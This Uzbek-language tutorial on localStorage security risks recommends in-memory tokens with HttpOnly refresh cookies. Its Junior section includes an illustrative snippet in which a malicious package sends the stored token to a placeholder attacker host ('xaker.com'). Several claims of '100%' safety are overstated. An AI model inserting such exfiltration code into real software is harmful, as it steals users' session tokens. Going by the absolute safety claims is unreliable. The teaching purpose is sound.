# LocalStorage Risks (LocalStorage Xavflari)

## Kirish

> [!IMPORTANT]
> **Nima uchun muhim?**  
> Dasturchilar uchun foydalanish juda oson bo'lgani uchun, ko'pincha JWT va boshqa muhim maxfiy ma'lumotlarni shunchaki `localStorage` ga saqlashadi. Biroq, `localStorage` mutlaqo xavfsiz emas! Agar loyihangizda bitta bo'lsa ham uchinchi tomon kutubxonasi (NPM packages) yoki CDN skriptida XSS zaifligi bo'lsa, xaker bitta qator kod (`localStorage.getItem('token')`) yordamida barcha foydalanuvchilar tokenlarini o'g'irlashi mumkin. `localStorage` xavflarini bilish va uning o'rniga xavfsiz alternativalarni qo'llash — tizim xavfsizligini ta'minlashning asosi hisoblanadi.

> [!NOTE]
> **Real-hayot analogiyasi: "Poyabzal javoni (LocalStorage)"**  
> Siz uyingizga kirdingiz va poyabzallarni tashqaridagi ochiq javonga (LocalStorage) qo'ydingiz.  
> - **LocalStorage (Ochiq javon):** Bu javonga hamma yaqinlasha oladi, ko'chadan o'tgan istalgan odam (XSS - zararli JS kodi) kelib poyabzalingizni (Tokenni) osongina o'g'irlab ketishi mumkin.  
> - **HttpOnly Cookie (Seyf):** Mehmonxonaning ichidagi maxsus seyf. Undagi narsalarni faqat siz kodingizni kiritib server orqali boshqara olasiz, ko'chadagi o'g'ri (JS kodi) unga umuman tegina olmaydi.

---

## 🟢 Junior (Asoslar va Tushunchalar)

Junior dasturchi "Storage" turlari va nega maxfiy narsalarni u yerga yozmaslik kerakligini bilishi shart.

### Storage turlari
Brauzer xotirasining (Client-side) asosan 3 xil turi bor:
1. **LocalStorage**: Brauzerni yopsangiz ham ma'lumot yo'qolmaydi (Doimiy). Max: 10mb atrofida.
2. **SessionStorage**: Brauzer oynasi (Tab) yopilishi bilan ma'lumot o'chib ketadi (Vaqtinchalik). Max: 5-10mb.
3. **Cookie**: Kichkina (4kb) va asosan Backend bilan ishlash uchun ixtiro qilingan.

### Xavfi nima?
LocalStorage XSS (Cross Site Scripting) ga 100% zaif. Ya'ni, saytingizdagi Ixtiyoriy bitta JavaScript kodi uni o'qiy oladi.
Tasavvur qiling siz loyihaga birov yasagan "Chiroyli Soat" vizualini NPM orqali o'rnatdingiz. Uni yasagan odam yomon niyatli bo'lsa ichiga bitta qator kod qo'shib qo'ygan bo'lishi mumkin:
```javascript
// Xaker kodi Tokeningizni o'zining serveriga jimgina jo'natyapti
fetch('https://xaker.com/steal-token', {
    method: 'POST',
    body: localStorage.getItem('token')
})
```
Shuning uchun u yerga **faqat xavfsiz** narsalarni (masalan: `theme: dark`, `lang: uz`) saqlash kerak holos.

---

## 🟡 Middle (Amaliyot va Detallar)

Middle dasturchi Tokenlarni xavfsiz saqlashning arxitekturasini (In-memory + HttpOnly) amalda qanday qo'llashni biladi.

### Eng Yaxshi Arxitektura (Memory + Cookie)
Foydalanuvchi login qildi, Backend dan nimalar qaytishi kerak?
- **Access Token (15 minutlik):** Buni siz JSON da qabul qilib olasiz va brauzerning LocalStorage/Cookie iga EMAS, balki JS dagi **o'zgaruvchi (variable)** yoki **Pinia/Vuex (state)** ichida saqlaysiz. Bunga XSS kira olmaydi! Va u har bir requestda Axios orqali Header ga qo'shilib ketadi.
- **Refresh Token (7 kunlik):** Buni siz JSON da olmaysiz! Uni Backend o'zi to'g'ridan to'g'ri HttpOnly Cookie ga yozib beradi. Bunga ham JS (XSS) umuman kira olmaydi!

```javascript
// Auth xizmati misoli
class AuthService {
  #accessToken = null; // Private o'zgaruvchi (Tashqaridan o'qib bo'lmaydi)

  setToken(token) {
    this.#accessToken = token;
  }

  getToken() {
    return this.#accessToken;
  }

  // Sahifa yangilansa Token o'chib ketadi, shu joyda Refresh orqali yangi token olamiz
  async refresh() {
    // Bu backendga jimgina borib keladi, HttpOnly Cookie o'zi avtomat qo'shilib ketadi
    const response = await axios.post('/api/refresh', {}, { withCredentials: true });
    this.setToken(response.data.accessToken); 
  }
}
```

Agar foydalanuvchi "F5" ni bossa sahifa yangilanib Variable (O'zgaruvchi) o'chib ketadi, lekin biz darhol `/refresh` ga so'rov tashlab Cookie dagi "Refresh Token" orqali yangi "Access Token" olib kelamiz. Shu tarzda tizim 100% xavfsiz ishlaydi.

---

## 🔴 Senior (Arxitektura va Optimizatsiya)

Senior dasturchi yirik muammolar: Cross-Tab synchronization, Supply Chain attack lar ustida bosh qotiradi.

### Cross-Tab muammosi (Tablar sinxronizatsiyasi)
Yuqoridagi arxitekturada biz ma'lumotni "In-Memory" saqladik. Ammo sizda Saytning 2 ta tabi ochiq bo'lsachi? Bitta tabda foydalanuvchi login qilsa ikkinchi tab buni qayerdan biladi? Localstorage bo'lganda u StorageEvent trigger qilar edi.
Yechim: **BroadcastChannel API** dan foydalanish yoki LocalStorage ni faqat "Trigger" sifatida ishlash. Ya'ni login bo'lganda LocalStorage ga qandaydir "auth-event: 1" qiymat yozamiz. Boshqa tablar buni StorageEvent orqali eshitib, "Ha foydalanuvchi login bo'libdi" deb o'zi uchun yangitdan `/refresh` so'rovini jo'natib In-Memory ga Tokenni yozib oladi.

### Shared Computer Attack (Jamoat kompyuteri)
Agar foydalanuvchi internet kafeda login qilib keyin Logout ni bosish esidan chiqib ketgan bo'lsa, qanday qilib uni himoya qilamiz?
LocalStorage da qolgan malumotni keyingi kirgan mijoz osongina o'qiydi. Shuning uchun:
- Barcha narsalarni Logout da tozalash kerak: `localStorage.clear(); sessionStorage.clear();`
- Idle Timeout (Qotib qolish): Agar sichqoncha 5 daqiqa qimirlamasa, Backend da ham, Frontend da ham sessiyani yakunlash algoritmi yozilishi shart.
- Browser yopilganda sezish: `beforeunload` orqali iloji boricha Backend ga `/logout` beacon'ini yuborib qolish kerak.

### Intervyu Savoli
**"Nima uchun JWT tokenni localStorage ga emas, HttpOnly cookie ga qo'yish kerak deysiz, axir HttpOnly cookie larda CSRF degan xavf bor-ku?"**
*Javob:*
JWT tokenni localStorage ga qo'yishimiz saytni to'g'ridan to'g'ri XSS (Zararli JavaScript inyektsiyasi) ga ochiq qilib qo'yadi. XSS CSRF dan ko'ra ancha xavfliroq, chunki xaker bizning tokenni to'liq o'g'irlab, xohlagan ishlarni cheksiz miqdorda qila oladi. HttpOnly cookie ni ishlatsak biz XSS xavfini nolgacha tushiramiz, CSRF ni (Boshqa saytdan so'rov jo'natish xavfini) esa hozirgi zamonaviy brauzerlar `SameSite=Lax` atributi yordamida deyarli 100% hal qilgan. Yana qo'shimchasiga Custom Header larni ishlatib CSRF ni batamom to'xtatish mumkin.

---

## Eng Yaxshi Amaliyotlar (Best Practices)

1. **Maxfiy ma'lumotlarni LocalStorage'da saqlamang:** Autentifikatsiya tokenlari (JWT, Session ID), shaxsiy ma'lumotlar yoki to'lov kartalari ma'lumotlarini aslo `localStorage` da saqlamang. Buning o'rniga faqat `HttpOnly; Secure` cookielardan yoki `Memory storage` (yoki in-memory state management: Vuex/Pinia) dan foydalaning.
2. **Tab'lararo aloqa zarur bo'lsa:** Agar ilovangizda tab'lararo ma'lumot uzatish kerak bo'lsa (masalan, foydalanuvchining login bo'lganligini bildirish), `localStorage` ga faqatgina trigger sifatida kichik, maxfiy bo'lmagan flag (masalan, `isLoggedIn: true`) saqlang. Asl JWT tokenni esa faqat in-memory saqlab, sub-tab ochilganda uni silent refresh (cookie orqali) bilan yuklab oling.
3. **Avtomatik tozalash va Timeoutlarni o'rnating:** Foydalanuvchi ma'lum vaqt harakatsiz tursa (Idle timeout) yoki tizimdan chiqqanda (`logout`), har doim `localStorage.clear()` va `sessionStorage.clear()` yordamida barcha client-side ma'lumotlarni tozalashni unutmang.

---

## Xulosa

LocalStorage xavfsizligi bo'yicha yakuniy xulosa:

| Strategiya | Xavfsizlik Darajasi | Muammo | Yechim |
| --- | --- | --- | --- |
| **JWT ni LocalStorage'da saqlash** | ❌ **Juda Xavfli** | XSS orqali tokenni o'g'irlash oson | Tokenni In-memory / HttpOnly cookieda saqlash |
| **Non-sensitive (Sozlamalar) saqlash** |  **Xavfsiz** | Muammo yo'q (masalan, dark-theme tanlovi) | Ruxsat etiladi |
| **In-Memory Storage + Cookie Refresh** |  **Maksimal Xavfsiz** | Brauzer yangilanganda token o'chib ketadi | Refresh Token orqali fonda yangi o'qib olish |

Sizning ilovangiz LocalStorage da token saqlayotgan bo'lsa bilingki - siz bitta qadam narida hack qilinishingiz mumkin. Zamonaviy xavfsizlik arxitekturasini bugunoq joriy qiling.

**Keyingi qadam:** [04-xss.md](./04-xss.md) - XSS (Cross Site Scripting) xavfini oldini olish va sanitarizatsiya qoidalari.
